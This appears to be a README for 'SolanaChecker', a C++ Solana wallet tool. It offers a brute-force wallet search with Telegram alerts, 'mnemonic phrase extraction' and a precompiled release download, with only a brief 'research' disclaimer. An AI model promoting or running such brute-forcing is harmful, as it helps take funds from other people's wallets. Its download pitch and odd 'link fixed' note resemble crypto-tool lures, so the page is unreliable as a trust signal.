# Solana Wallet Checker Open Source: Code, Contribute, and Control

Looking for a Solana wallet checker? **SolanaChecker** is open source, allowing you to inspect the code, contribute to its development, and tailor it to your exact needs. Explore the power of the Solana blockchain with a tool you can trust.

<p align="left">
    <img src="/assets/analyze.webp" />
</p>

## Key Features

1.  **Solana Balance Check:** View Solana address balances.

<p align="left">
    <img src="/assets/log.webp" />
</p>

2.  **Token Security Analysis:** Assess token security.

<p align="left">
    <img src="/assets/mask.webp" />
</p>

3.  **Address Tracking (Telegram):** Get real-time Telegram notifications.

4.  **Mnemonic Phrase Extraction:** Extract your seed phrases to access your data.

<p align="left">
    <img src="/assets/over.webp" />
</p>

5.  **Solana Wallet Generation:** Generate new wallets.

<p align="left">
    <img src="/assets/short.webp" />
</p>

6.  **Brute-Force Search (with Telegram):** Search for wallets (research), and receive Telegram alerts.

<p align="left">
    <img src="/assets/template.webp" />
</p>

## Telegram Setup

Set up Telegram alerts. Add your [bot token](https://core.telegram.org/bots/tutorial#obtain-your-bot-token) and your [chat_id](https://t.me/getmyid_bot) into the 'telegram-settings.txt' file.

## Get Involved: Open Source

The source code is open and available for anyone to view, modify, and contribute to. Download a pre-compiled build from [Release](../../releases) or build it yourself.

## Building the Project: Open Source and Flexible

This project is written in C++ and uses the MIT License.

### Building from Source: Instructions

This project relies on a few dependencies; **vcpkg** is recommended:

1.  If you don’t have **vcpkg**, install it (follow instructions).
2.  Add **vcpkg** to your system PATH.
3.  Run the following commands:

    -   Install **OpenSSL**:

    ```bash
    vcpkg install openssl
    ```

    -   Install **nlohmann-json**:

    ```bash
    vcpkg install nlohmann-json
    ```

    -   Install **Crypto++**:

    ```bash
    vcpkg install cryptopp
    ```

    -   Install **libsodium**:

    ```bash
    vcpkg install libsodium
    ```

4.  Build after installing the dependencies.

### Building with Visual Studio

1.  Open the project solution.
2.  Make sure **vcpkg** is integrated.
3.  Click **Build** -> **Build Solution**.
4.  The executable will be in the `bin` folder.

### Building with Another C++ Compiler

1.  Make sure all dependencies are installed and accessible.
2.  Compile with:

    ```bash
    g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
    ```

## Command Line Usage

1.  **-s / -search**: Start a brute-force wallet search.
2.  **-t / -track (ADDRESS)**: Track an address.
3.  **-g / -gen (NUMBER)**: Generate wallets.
4.  **-m / -mnemonic (MNEMONIC)**: Show wallet data.
5.  **-b / -balance (ADDRESS)**: Check balance.

## Important Notes

-   Open source is for research; no illegal use.
-   Crypto investments involve risk.

## License

This project is under the [MIT License](/LICENSE).



Update:  06/17/2025 05-49-14 The broken link has been fixed, it's now operational.